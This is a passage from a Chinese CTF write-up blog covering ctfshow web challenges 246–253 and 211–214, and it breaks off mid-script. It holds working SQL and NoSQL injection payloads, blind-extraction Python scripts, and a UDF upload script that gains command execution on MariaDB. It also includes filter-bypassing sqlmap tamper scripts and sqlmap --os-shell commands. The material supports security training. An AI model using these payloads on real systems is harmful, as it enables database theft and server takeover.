1,count(*),concat_ws(&#x27;-&#x27;,(select concat(flag2) from ctfshow_flags limit 0,1),floor(rand(0)*2)) as a from information_schema.tables group by a--+</span><br></pre></td></tr></table></figure><h2 id="web247"><a class="header-anchor" href="#web247">¶</a>web247</h2><ul><li>描述: error</li></ul><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">//无过滤</span><br><span class="line">过滤updatexml extractvalue floor</span><br></pre></td></tr></table></figure><p>利用其他函数替换floor即可, 例如:</p><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">floor()向下取整</span><br><span class="line">ceil()向上取整</span><br><span class="line">round()四舍五入</span><br></pre></td></tr></table></figure><p>所以payload:</p><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line"># 查表</span><br><span class="line">?id=-1&#x27; union select 1,count(*),concat(0x3a,0x3a,(select (table_name) from information_schema.tables where table_schema=database() limit 1,1),0x3a,0x3a,round(rand(0)*2))a from information_schema.columns group by a%23</span><br><span class="line"># 查列</span><br><span class="line">?id=-1&#x27; union select 1,count(*),concat(0x3a,0x3a,(select (column_name) from information_schema.columns where table_name=&#x27;ctfshow_flagsa&#x27; limit 1,1),0x3a,0x3a,round(rand(0)*2))a from information_schema.columns group by a%23</span><br><span class="line"># 查数据</span><br><span class="line">?id=-1&#x27; union select 1,count(*),concat_ws(&#x27;-&#x27;,(select concat(`flag?`) from ctfshow_flagsa limit 0,1),round(rand(0)*2)) as a from information_schema.tables group by a--+</span><br></pre></td></tr></table></figure><h2 id="web248"><a class="header-anchor" href="#web248">¶</a>web248</h2><ul><li>描述: eval</li></ul><p>提示是UDF注入, 无过滤</p><blockquote><p>芝士<a href="https://www.freebuf.com/articles/web/283566.html">大佬解析</a>, 似乎该方法还有一个提权操作</p></blockquote><p>user defined function, 用户自定义函数, 关联语法如下:</p><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">CREATE [AGGREGATE] FUNCTION [IF NOT EXISTS] function_name</span><br><span class="line">    RETURNS &#123;STRING|INTEGER|REAL|DECIMAL&#125;</span><br><span class="line">    SONAME shared_library_name</span><br></pre></td></tr></table></figure><p>必要的信息收集的指令:</p><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">select version()</span><br><span class="line">select @@basedir  #查看sql安装路径</span><br><span class="line">show variables like &quot;secure_file_priv&quot;; #能读入或写入文件的路径</span><br><span class="line">select @@plugin_dir #查看plugin_dir路径</span><br></pre></td></tr></table></figure><p>没有上传点, 这个udf.so要用某种方式上传</p><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">/api/?id=1&#x27;; select @@plugin_dir; #</span><br><span class="line"># 查出Mysql插件路径：/usr/lib/mariadb/plugin/</span><br><span class="line"></span><br><span class="line">/api/?id=&#x27;;CREATE FUNCTION sys_eval RETURNS STRING SONAME &#x27;udf.so&#x27;;#</span><br><span class="line"># 引入udf.so文件从而创建函数sys_eval</span><br></pre></td></tr></table></figure><p>给出大佬脚本, 以及<a href="https://www.sqlsec.com/tools/udf.html">sqlmap udf文件的16进制</a>, 将0x后的十六进制放入udf字符串即可, 记得去掉头尾</p><p>因为是GET传值有长度限制, 所以用分段传值</p><figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">import</span> requests</span><br><span class="line">url=<span class="string">&quot;http://e2faf183-01d8-4b41-acbf-ad08aafe7599.challenge.ctf.show/api/&quot;</span></span><br><span class="line">udf=<span class="string">&quot;&quot;</span></span><br><span class="line"><span class="comment"># 用的网站提供的lib_mysqludf_sys_64.so</span></span><br><span class="line">udfs=[]</span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">0</span>,<span class="built_in">len</span>(udf),<span class="number">5000</span>):</span><br><span class="line">    udfs.append(udf[i:i+<span class="number">5000</span>])</span><br><span class="line"><span class="comment">#写入多个文件中</span></span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> udfs:</span><br><span class="line">    url1=url+<span class="string">f&quot;?id=1&#x27;;SELECT &#x27;<span class="subst">&#123;i&#125;</span>&#x27; into dumpfile &#x27;/tmp/&quot;</span>+<span class="built_in">str</span>(udfs.index(i))+<span class="string">&quot;.txt&#x27;%23&quot;</span></span><br><span class="line">    requests.get(url1)</span><br><span class="line"></span><br><span class="line"><span class="comment">#合并文件生成so文件</span></span><br><span class="line">url2=url+<span class="string">&quot;?id=1&#x27;;SELECT unhex(concat(load_file(&#x27;/tmp/0.txt&#x27;),load_file(&#x27;/tmp/1.txt&#x27;),load_file(&#x27;/tmp/2.txt&#x27;),load_file(&#x27;/tmp/3.txt&#x27;))) into dumpfile &#x27;/usr/lib/mariadb/plugin/hack.so&#x27;%23&quot;</span></span><br><span class="line">requests.get(url2)</span><br><span class="line"></span><br><span class="line"><span class="comment">#创建自定义函数并执行恶意命令</span></span><br><span class="line">requests.get(url+<span class="string">&quot;?id=1&#x27;;create function sys_eval returns string soname &#x27;hack.so&#x27;%23&quot;</span>)</span><br><span class="line">r=requests.get(url+<span class="string">&quot;?id=1&#x27;;select sys_eval(&#x27;cat /f*&#x27;)%23&quot;</span>)</span><br><span class="line"><span class="built_in">print</span>(r.text)</span><br></pre></td></tr></table></figure><h2 id="web249"><a class="header-anchor" href="#web249">¶</a>web249</h2><ul><li>描述: 开始nosql,flag在flag中</li></ul><figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="comment">//无过滤</span></span><br><span class="line"><span class="variable">$user</span> = <span class="variable">$memcache</span>-&gt;<span class="title function_ invoke__">get</span>(<span class="variable">$id</span>);</span><br></pre></td></tr></table></figure><p>nosql注入, 指的意思是Not only SQL</p><ol><li>键值对</li></ol><p><code>memcached::get()</code>方法支持传递一个键，返回对应的值，也支持传递一个数组，把数组中所有元素当做键查询并返回值。因此可以传递一个数组，数组中包含键flag，这样就能绕过inval同时也能得到flag的结果了</p><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">?id[]=flag</span><br><span class="line"># 键值对可以直接干了</span><br></pre></td></tr></table></figure><h2 id="web250"><a class="header-anchor" href="#web250">¶</a>web250</h2><ul><li>描述: nosql</li></ul><figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="variable">$query</span> = <span class="keyword">new</span> MongoDB\Driver\<span class="title function_ invoke__">Query</span>(<span class="variable">$data</span>);</span><br><span class="line"><span class="variable">$cursor</span> = <span class="variable">$manager</span>-&gt;<span class="title function_ invoke__">executeQuery</span>(<span class="string">&#x27;ctfshow.ctfshow_user&#x27;</span>, <span class="variable">$query</span>)-&gt;<span class="title function_ invoke__">toArray</span>();</span><br><span class="line"></span><br><span class="line"><span class="comment">//无过滤</span></span><br><span class="line"><span class="keyword">if</span>(<span class="title function_ invoke__">count</span>(<span class="variable">$cursor</span>)&gt;<span class="number">0</span>)&#123;</span><br><span class="line">  <span class="variable">$ret</span>[<span class="string">&#x27;msg&#x27;</span>]=<span class="string">&#x27;登陆成功&#x27;</span>;</span><br><span class="line">  <span class="title function_ invoke__">array_push</span>(<span class="variable">$ret</span>[<span class="string">&#x27;data&#x27;</span>], <span class="variable">$flag</span>);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>MongoDB重言式</p><p>在mongodb中，要求的查询语句是json格式，如<code>&#123;&quot;username&quot;: &quot;admin&quot;, &quot;password&quot;: &quot;admin&quot;&#125;</code></p><p>在php中，json就是数组，也就是<code>Array('username'=&gt; 'admin', 'password'=&gt; 'admin')</code>，</p><p>同时MongoDB要求的json格式中，是可以进行条件查询的，如这样的json: <code>&#123;&quot;username&quot;: &quot;admin&quot;, &quot;password&quot;: &#123;&quot;$regex&quot;: '^abc$'&#125;&#125;</code>，会匹配密码abc</p><p>也就是说，如果键对应的值是一个字符串，那么就相当于条件等于，只不过省去了json，如果键对应的值是json对象，就代表是条件查询</p><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">username[$ne]=1&amp;password[$ne]=1</span><br></pre></td></tr></table></figure><blockquote><p><code>$ne</code>是不相等的意思, <code>$regex</code>则是正则匹配</p></blockquote><h2 id="web251"><a class="header-anchor" href="#web251">¶</a>web251</h2><ul><li>描述: 同上</li></ul><p>发包发现总是匹配admin没有flag, 给他去了即可</p><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">username[$ne]=admin&amp;password[$ne]=1</span><br></pre></td></tr></table></figure><h2 id="web252"><a class="header-anchor" href="#web252">¶</a>web252</h2><ul><li>描述: 同上</li></ul><figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="comment">//sql</span></span><br><span class="line">db.ctfshow_user.<span class="title function_ invoke__">find</span>(&#123;<span class="attr">username</span>:<span class="string">&#x27;$username&#x27;</span>,<span class="attr">password</span>:<span class="string">&#x27;$password&#x27;</span>&#125;).<span class="title function_ invoke__">pretty</span>()</span><br></pre></td></tr></table></figure><p>用正则匹配即可固定</p><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">username[$regex]=^[^admin].*$&amp;password[$ne]=1</span><br><span class="line">username[$ne]=1&amp;password[$regex]=ctfshow&#123;</span><br></pre></td></tr></table></figure><h2 id="web253"><a class="header-anchor" href="#web253">¶</a>web253</h2><ul><li>描述: 同上</li></ul><p>你说的对, 写着是可以显示flag, 但是就是返回不了, 只会显示登录成功</p><p>那就换成盲注, 主要是要过滤掉错误的登录用户名</p><figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">import</span> requests, time, json</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">brute</span>(<span class="params">action, username=<span class="string">&quot;&quot;</span></span>):</span><br><span class="line">    url = <span class="string">&quot;http://44e163eb-3f69-4641-83b2-5499d9c0d5ed.challenge.ctf.show/api/&quot;</span></span><br><span class="line">    <span class="keyword">if</span> action == <span class="string">&quot;username&quot;</span>:</span><br><span class="line">        res = <span class="string">&quot;^[^a]&quot;</span>  <span class="comment"># admin1的password为ctfshow666...很明显不是flag，所以禁掉admin开头的用户</span></span><br><span class="line">    <span class="keyword">else</span>:</span><br><span class="line">        res = <span class="string">&quot;^ctfshow&#123;&quot;</span></span><br><span class="line">    <span class="keyword">for</span> j <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">30</span>):</span><br><span class="line">        flag = <span class="literal">False</span></span><br><span class="line">        <span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">127</span>):</span><br><span class="line">            reg = res</span><br><span class="line">            <span class="keyword">if</span> <span class="built_in">chr</span>(i) <span class="keyword">not</span> <span class="keyword">in</span> <span class="string">&quot;0123456789abcdefghijklmnopqrstuvwxyz-&#123;&#125;:,_&quot;</span>:</span><br><span class="line">                <span class="keyword">continue</span></span><br><span class="line">            n = <span class="built_in">chr</span>(i)</span><br><span class="line">            <span class="keyword">if</span> <span class="built_in">chr</span>(i) <span class="keyword">in</span> <span class="string">&quot;-&#123;&#125;:&quot;</span>:</span><br><span class="line">                n = <span class="string">&quot;\\&quot;</span>+<span class="built_in">chr</span>(i)</span><br><span class="line">            <span class="built_in">print</span>(<span class="built_in">chr</span>(i))</span><br><span class="line">            <span class="keyword">if</span> action == <span class="string">&quot;username&quot;</span>:</span><br><span class="line">                data = &#123;<span class="string">&quot;username[$regex]&quot;</span>: <span class="string">f&quot;<span class="subst">&#123;reg+n&#125;</span>&quot;</span>, <span class="string">&quot;password[$ne]&quot;</span>: <span class="string">f&quot;1&quot;</span>&#125;</span><br><span class="line">            <span class="keyword">else</span>:</span><br><span class="line">                data = &#123;<span class="string">&quot;username[$regex]&quot;</span>: <span class="string">f&quot;<span class="subst">&#123;username&#125;</span>$&quot;</span>, <span class="string">&quot;password[$regex]&quot;</span>: <span class="string">f&quot;<span class="subst">&#123;reg+n&#125;</span>&quot;</span>&#125;</span><br><span class="line">            <span class="keyword">while</span> <span class="literal">True</span>:</span><br><span class="line">                <span class="keyword">try</span>:</span><br><span class="line">                    r = requests.post(url, data=data, timeout=<span class="number">7</span>)</span><br><span class="line">                    <span class="keyword">break</span></span><br><span class="line">                <span class="keyword">except</span> TimeoutError:</span><br><span class="line">                    time.sleep(<span class="number">0.1</span>)</span><br><span class="line">                <span class="keyword">except</span> KeyboardInterrupt:</span><br><span class="line">                    exit(<span class="number">0</span>)</span><br><span class="line">            <span class="keyword">try</span>:</span><br><span class="line">                resp = json.loads(r.text)</span><br><span class="line">            <span class="keyword">except</span>:</span><br><span class="line">                resp = <span class="literal">None</span></span><br><span class="line">                <span class="keyword">continue</span></span><br><span class="line">            <span class="keyword">if</span> resp[<span class="string">&quot;msg&quot;</span>] == <span class="string">&quot;\u767b\u9646\u6210\u529f&quot;</span>:</span><br><span class="line">                res += <span class="built_in">chr</span>(i)</span><br><span class="line">                flag = <span class="literal">True</span></span><br><span class="line">                <span class="keyword">break</span></span><br><span class="line">        <span class="keyword">if</span> <span class="keyword">not</span> flag:</span><br><span class="line">            <span class="keyword">break</span></span><br><span class="line">        <span class="built_in">print</span>(res)</span><br><span class="line">    <span class="keyword">return</span> res</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> __name__ == <span class="string">&#x27;__main__&#x27;</span>:</span><br><span class="line">    username = brute(<span class="string">&quot;username&quot;</span>)</span><br><span class="line">    <span class="built_in">print</span>(<span class="string">f&quot;用户名为: <span class="subst">&#123;username&#125;</span>&quot;</span>)</span><br><span class="line">    password = brute(<span class="string">&quot;password&quot;</span>, username)</span><br><span class="line">    <span class="built_in">print</span>(<span class="string">f&quot;用户名: <span class="subst">&#123;username&#125;</span>\n密码: <span class="subst">&#123;password&#125;</span>&quot;</span>)</span><br></pre></td></tr></table></figure><p>又找了一个大佬的脚本, 比较简洁</p><figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">import</span> requests</span><br><span class="line"><span class="keyword">import</span> string</span><br><span class="line">table = string.digits+string.ascii_lowercase+string.ascii_uppercase+<span class="string">&#x27;_&#123;&#125;-,&#x27;</span></span><br><span class="line">url = <span class="string">&#x27;http://b4a88d5f-235b-4e06-b7b9-3cf10e9c26de.challenge.ctf.show/api/index.php&#x27;</span></span><br><span class="line">flag = <span class="string">&#x27;&#x27;</span></span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">100</span>):</span><br><span class="line">    <span class="keyword">for</span> j <span class="keyword">in</span> table:</span><br><span class="line">        tmp = flag+j</span><br><span class="line">        payload1 = <span class="string">f&#x27;f<span class="subst">&#123;tmp&#125;</span>.*$&#x27;</span></span><br><span class="line">        data1 = &#123;<span class="string">&#x27;username[$regex]&#x27;</span>:payload1</span><br><span class="line">                ,<span class="string">&#x27;password[$ne]&#x27;</span>:<span class="number">1</span>&#125;</span><br><span class="line"></span><br><span class="line">        payload2 = <span class="string">f&#x27;^<span class="subst">&#123;tmp&#125;</span>.*$&#x27;</span></span><br><span class="line">        data2 = &#123;<span class="string">&#x27;username[$regex]&#x27;</span>:<span class="string">&#x27;flag&#x27;</span></span><br><span class="line">                 ,<span class="string">&#x27;password[$regex]&#x27;</span>:payload2&#125;</span><br><span class="line">        r = requests.post(url=url, data=data2).text</span><br><span class="line">        <span class="keyword">if</span> <span class="string">r&quot;\u767b\u9646\u6210\u529f&quot;</span> <span class="keyword">in</span> r:</span><br><span class="line">            flag += j</span><br><span class="line">            <span class="built_in">print</span>(flag)</span><br><span class="line">            <span class="keyword">break</span></span><br></pre></td></tr></table></figure>]]></content>
      
      
      <categories>
          
          <category> ctfshow靶场 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> MySQL </tag>
            
            <tag> 绕过 </tag>
            
            <tag> SQL注入 </tag>
            
            <tag> UDF </tag>
            
            <tag> SQL盲注 </tag>
            
            <tag> 无列注入 </tag>
            
            <tag> NoSQL </tag>
            
            <tag> 报错注入 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>Web入门_sql注入_3</title>
      <link href="/article/ctfshow-webbasic-sql-3/"/>
      <url>/article/ctfshow-webbasic-sql-3/</url>
      
        <content type="html"><![CDATA[<link rel="stylesheet" class="aplayer-secondary-style-marker" href="/assets/css/APlayer.min.css"><script src="/assets/js/APlayer.min.js" class="aplayer-secondary-script-marker"></script><script class="meting-secondary-script-marker" src="/assets/js/Meting.min.js"></script><h1>sql注入</h1><hr><h2 id="web211"><a class="header-anchor" href="#web211">¶</a>web211</h2><ul><li>描述: 开始系统练习sqlmap的使用</li></ul><p>增加了对于加空格的过滤</p><figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="comment">//对查询字符进行解密</span></span><br><span class="line">  <span class="function"><span class="keyword">function</span> <span class="title">decode</span>(<span class="params"><span class="variable">$id</span></span>)</span>&#123;</span><br><span class="line">    <span class="keyword">return</span> <span class="title function_ invoke__">strrev</span>(<span class="title function_ invoke__">base64_decode</span>(<span class="title function_ invoke__">strrev</span>(<span class="title function_ invoke__">base64_decode</span>(<span class="variable">$id</span>))));</span><br><span class="line">  &#125;</span><br><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">waf</span>(<span class="params"><span class="variable">$str</span></span>)</span>&#123;</span><br><span class="line">    <span class="keyword">return</span> <span class="title function_ invoke__">preg_match</span>(<span class="string">&#x27;/ /&#x27;</span>, <span class="variable">$str</span>);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>改一下脚本增加个替换就可以了, 或者你重新写一个盲注脚本</p><figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="comment">#!/usr/bin/env python</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">from</span> lib.core.compat <span class="keyword">import</span> xrange</span><br><span class="line"><span class="keyword">from</span> lib.core.enums <span class="keyword">import</span> PRIORITY</span><br><span class="line"><span class="keyword">import</span> base64</span><br><span class="line"><span class="keyword">import</span> string</span><br><span class="line"></span><br><span class="line">__priority__ = PRIORITY.LOW</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">tamper</span>(<span class="params">payload, **kwargs</span>):</span><br><span class="line">    retVal = payload</span><br><span class="line">    <span class="keyword">if</span> payload:</span><br><span class="line">        payload = payload.replace(<span class="string">&quot; &quot;</span>, <span class="built_in">chr</span>(<span class="number">0x0a</span>))</span><br><span class="line">        payload = payload[::-<span class="number">1</span>].encode()</span><br><span class="line">        payload = base64.b64encode(payload)</span><br><span class="line">        payload = (payload.decode())[::-<span class="number">1</span>]</span><br><span class="line">        payload = base64.b64encode(payload.encode())</span><br><span class="line">        retVal = payload.decode()</span><br><span class="line"></span><br><span class="line">    <span class="keyword">return</span> retVal</span><br></pre></td></tr></table></figure><p>payload:</p><p>注意换表换成<code>ctfshow_flavia</code></p><figure class="highlight powershell"><table><tr><td class="code"><pre><span class="line">python3 .\sqlmap.py <span class="literal">-u</span> <span class="string">&quot;http://80b02ad6-2024-4835-a430-fed169bff73b.challenge.ctf.show/api/index.php&quot;</span> <span class="literal">--data</span> <span class="string">&quot;id=1&quot;</span> <span class="literal">--user-agent</span>=sqlmap <span class="literal">--referer</span>=ctf.show <span class="literal">--method</span>=PUT <span class="literal">--header</span>=content<span class="literal">-type</span>:text/plain <span class="literal">--safe-url</span>=<span class="string">&quot;http://80b02ad6-2024-4835-a430-fed169bff73b.challenge.ctf.show/api/getToken.php&quot;</span> <span class="literal">--safe-freq</span>=<span class="number">1</span> <span class="literal">--cookie</span>=<span class="string">&quot;PHPSESSID=bcluqhthjg7ikn0i7qee5dcstc&quot;</span> <span class="literal">--tamper</span>=personal <span class="literal">-D</span> ctfshow_web <span class="literal">-T</span> ctfshow_flavia <span class="literal">--dump</span></span><br></pre></td></tr></table></figure><p>官方化简py程序如下, 替换if语句即可</p><figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">if</span> payload:</span><br><span class="line">    retVal = retVal.replace(<span class="string">&quot; &quot;</span>,<span class="built_in">chr</span>(<span class="number">0x0a</span>))</span><br><span class="line">    retVal = base64.b64encode(retVal[::-<span class="number">1</span>].encode (<span class="string">&#x27;utf-8&#x27;</span>))</span><br><span class="line">    retVal = base64.b64encode(retVal[::-<span class="number">1</span>]).decode(<span class="string">&#x27;utf-8&#x27;</span>)</span><br></pre></td></tr></table></figure><h2 id="web212"><a class="header-anchor" href="#web212">¶</a>web212</h2><ul><li>描述: 同上</li></ul><p>增加过滤<code>*</code>, 没什么好说的, 针对的是上一题用的<code>space2comment.py</code>的方法</p><figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="comment">#!/usr/bin/env python</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">from</span> lib.core.compat <span class="keyword">import</span> xrange</span><br><span class="line"><span class="keyword">from</span> lib.core.enums <span class="keyword">import</span> PRIORITY</span><br><span class="line"><span class="keyword">import</span> base64</span><br><span class="line"><span class="keyword">import</span> string</span><br><span class="line"></span><br><span class="line">__priority__ = PRIORITY.LOW</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">tamper</span>(<span class="params">payload, **kwargs</span>):</span><br><span class="line">    retVal = payload</span><br><span class="line">    <span class="keyword">if</span> payload:</span><br><span class="line">        retVal = retVal.replace(<span class="string">&quot; &quot;</span>, <span class="built_in">chr</span>(<span class="number">0x0a</span>))</span><br><span class="line">        retVal = retVal.replace(<span class="string">&quot;COUNT(*)&quot;</span>, <span class="string">&quot;COUNT(id)&quot;</span>)</span><br><span class="line">        retVal = base64.b64encode(retVal[::-<span class="number">1</span>].encode(<span class="string">&#x27;utf-8&#x27;</span>))</span><br><span class="line">        retVal = base64.b64encode(retVal[::-<span class="number">1</span>]).decode(<span class="string">&#x27;utf-8&#x27;</span>)</span><br><span class="line"></span><br><span class="line">    <span class="keyword">return</span> retVal</span><br></pre></td></tr></table></figure><p>payload, 记得换表:</p><figure class="highlight powershell"><table><tr><td class="code"><pre><span class="line">python3 .\sqlmap.py <span class="literal">-u</span> <span class="string">&quot;http://b57ca267-13ab-462d-89fe-af58d1f06ea6.challenge.ctf.show/api/index.php&quot;</span> <span class="literal">--data</span> <span class="string">&quot;id=1&quot;</span> <span class="literal">--user-agent</span>=sqlmap <span class="literal">--referer</span>=ctf.show <span class="literal">--method</span>=PUT <span class="literal">--header</span>=content<span class="literal">-type</span>:text/plain <span class="literal">--safe-url</span>=<span class="string">&quot;http://b57ca267-13ab-462d-89fe-af58d1f06ea6.challenge.ctf.show/api/getToken.php&quot;</span> <span class="literal">--safe-freq</span>=<span class="number">1</span> <span class="literal">--cookie</span>=<span class="string">&quot;PHPSESSID=846olilf219u193rejj4sogmep&quot;</span> <span class="literal">--tamper</span>=personal <span class="literal">-D</span> ctfshow_web <span class="literal">-T</span> ctfshow_flavis <span class="literal">--dump</span></span><br></pre></td></tr></table></figure><h2 id="web213"><a class="header-anchor" href="#web213">¶</a>web213</h2><ul><li>描述: 同上</li></ul><p>练习使用–os-shell 一键getshell?</p><figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="comment">#!/usr/bin/env python</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">from</span> lib.core.compat <span class="keyword">import</span> xrange</span><br><span class="line"><span class="keyword">from</span> lib.core.enums <span class="keyword">import</span> PRIORITY</span><br><span class="line"><span class="keyword">import</span> base64</span><br><span class="line"><span class="keyword">import</span> string</span><br><span class="line"></span><br><span class="line">__priority__ = PRIORITY.LOW</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">tamper</span>(<span class="params">payload, **kwargs</span>):</span><br><span class="line">    retVal = payload</span><br><span class="line">    <span class="keyword">if</span> payload:</span><br><span class="line">        retVal = retVal.replace(<span class="string">&quot;-- -&quot;</span>, <span class="string">&quot;#&quot;</span>)</span><br><span class="line">        retVal = retVal.replace(<span class="string">&quot; &quot;</span>, <span class="built_in">chr</span>(<span class="number">0x0a</span>))</span><br><span class="line">        retVal = retVal.replace(<span class="string">&quot;COUNT(*)&quot;</span>, <span class="string">&quot;COUNT(id)&quot;</span>)</span><br><span class="line">        retVal = base64.b64encode(retVal[::-<span class="number">1</span>].encode(<span class="string">&#x27;utf-8&#x27;</span>))</span><br><span class="line">        retVal = base64.b64encode(retVal[::-<span class="number">1</span>]).decode(<span class="string">&#x27;utf-8&#x27;</span>)</span><br><span class="line"></span><br><span class="line">    <span class="keyword">return</span> retVal</span><br><span class="line"></span><br></pre></td></tr></table></figure><p>为什么替换为<code>#</code>, 原因是写入的文件<code>-- -</code>在第三个减号换行后就无效了, 所以要替换</p><figure class="highlight powershell"><table><tr><td class="code"><pre><span class="line">python3 .\sqlmap.py <span class="literal">-u</span> <span class="string">&quot;http://93d1c17f-ea86-493d-8a5a-d1fd395301e6.challenge.ctf.show/api/index.php&quot;</span> <span class="literal">--data</span> <span class="string">&quot;id=1&quot;</span> <span class="literal">--user-agent</span>=sqlmap <span class="literal">--referer</span>=ctf.show <span class="literal">--method</span>=PUT <span class="literal">--header</span>=content<span class="literal">-type</span>:text/plain <span class="literal">--safe-url</span>=<span class="string">&quot;http://93d1c17f-ea86-493d-8a5a-d1fd395301e6.challenge.ctf.show/api/getToken.php&quot;</span> <span class="literal">--safe-freq</span>=<span class="number">1</span> <span class="literal">--cookie</span>=<span class="string">&quot;PHPSESSID=qdk8hjthjlr3tec5n4d4oear29&quot;</span> <span class="literal">--tamper</span>=personal <span class="literal">--os-shell</span></span><br></pre></td></tr></table></figure><p>连接成功后界面显示如下, 输入数字来选择写入的shell, 还不能执行命令, 后面就是执行命令</p><p><img src="https://cdn.jsdelivr.net/gh/4reexile/Misc_/images/md/image-20240815094344373.png" alt="image-20240815094344373"></p><p>那些什么Y/n只要能执行就好了, 有的不选是就报错; 最后flag在根目录下</p><p><img src="https://cdn.jsdelivr.net/gh/4reexile/Misc_/images/md/image-20240815094638712.png" alt="image-20240815094638712"></p><h2 id="web214"><a class="header-anchor" href="#web214">¶</a>web214</h2><ul><li>描述: 开始时间盲注</li></ul><p>界面啥都没有, 没有提交界面找半天, 抓包也没有, 然后发现还能去首页抓抓包</p><p>在首页抓包可以发现在<code>/api/</code>提交参数<code>ip</code>和<code>debug</code>, 将debug修改为1发现回显ip内容, 似乎没有带单引号直接回显</p><blockquote><p>我这里抓https是抓不到的, 只能在http抓到</p></blockquote><p>测试语句: <code>ip=if(2&gt;1,sleep(5),1)&amp;debug=1</code>, 可以感觉到差不多延时5s</p><h3 id="sqlmap的方法"><a class="header-anchor" href="#sqlmap的方法">¶</a>sqlmap的方法</h3><p>诶, 我有一个点子☝🤓, 我们来用sqlmap:</p><p>将这个请求包整个塞进txt文档, 两个参数设置为1, 交给sqlmap进行处理, 这里是bp.txt</p><figure class="highlight powershell"><table><tr><td class="code"><pre><span class="line">python3 .\sqlmap.py <span class="literal">-r</span> bp.txt</span><br></pre></td></tr></table></figure><p>发现执行成功, 能显示是Mysql数据库, 加上其他参数爆库爆表等即可, 其实也可以直接 -a, 只不过慢得很</p><figure class="highlight powershell"><table><tr><td class="code"><pre><span class="line">python3 .\sqlmap.py <span class="literal">-r</span> bp.txt <span class="literal">-D</span> ctfshow_web <span class="literal">-T</span> ctfshow_flagx <span class="literal">--dump</span></span><br></pre></td></tr></table></figure><h3 id="python的方法"><a class="header-anchor" href="#python的方法">¶</a>python的方法</h3><p>能跑就别动</p><blockquote><p>脚本有时候会跑出错误, 如果前面都能跑, 到某一个地方不能跑了, 重新跑上面的语句看看是都出错</p></blockquote><figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">import</span> requests</span><br><span class="line"><span class="keyword">import</span> time</span><br><span class="line"></span><br><span class="line">url = <span class="string">&quot;http://28c1e710-14df-4ace-9539-a74068fd1598.challenge.ctf.show/api/&quot;</span></span><br><span class="line">flagstr = <span class="string">&quot;,_&#123;&#125;-abcdefghijklmnopqrstuvwxyz0123456789&quot;</span></span><br><span class="line">flag = <span class="string">&quot;&quot;</span></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">1</span>, <span class="number">60</span>):</span><br><span class="line">    <span class="keyword">for</span> mid <span class="keyword">in</span> flagstr:</span><br><span class="line">        <span class="comment"># 数据库: ctfshow_web</span></span><br><span class="line">        <span class="comment"># payload = &quot;if((substr((select database()),&#123;&#125;,1)=&#x27;&#123;&#125;&#x27;),sleep(0.5),1)&quot;.format(i, mid)</span></span><br><span class="line">        <span class="comment"># 表名: ctfshow_flagx</span></span><br><span class="line">        <span class="comment"># payload = &quot;if((substr((select group_concat(table_name) from information_schema.tables where table_schema = database()),&#123;&#125;,1)=&#x27;&#123;&#125;&#x27;),sleep(0.5),1)&quot;.format(i, mid)</span></span><br><span class="line">        <span class="comment"># 字段: id,flaga</span></span><br><span class="line">        <span class="comment"># payload = &quot;if ((substr((select group_concat(column_name) from information_schema.columns where table_name = &#x27;ctfshow_flagx&#x27;),&#123;&#125;,1)=&#x27;&#123;&#125;&#x27;),sleep(0.5),1)&quot;.format(i, mid)</span></span><br><span class="line">        <span class="comment"># 获取flag: ctfshow&#123;5231f260-63a8-4d71-a949-24295e7e8398&#125;</span></span><br><span class="line">        payload = <span class="string">&quot;if((substr((select flaga from ctfshow_flagx),&#123;&#125;,1)=&#x27;&#123;&#125;&#x27;),sleep(0.5),1)&quot;</span>.<span class="built_in">format</span>(i, mid)</span><br><span class="line"></span><br><span class="line">        <span class="built_in">print</span>(<span class="string">&quot;[+]Now testing the &quot;</span> + <span class="built_in">str</span>(i) + <span class="string">&quot;th character \&#x27;&quot;</span> + mid + <span class="string">&quot;\&#x27;&quot;</span>)</span><br><span class="line"></span><br><span class="line">        data = &#123;</span><br><span class="line">            <span class="string">&quot;ip&quot;</span>: 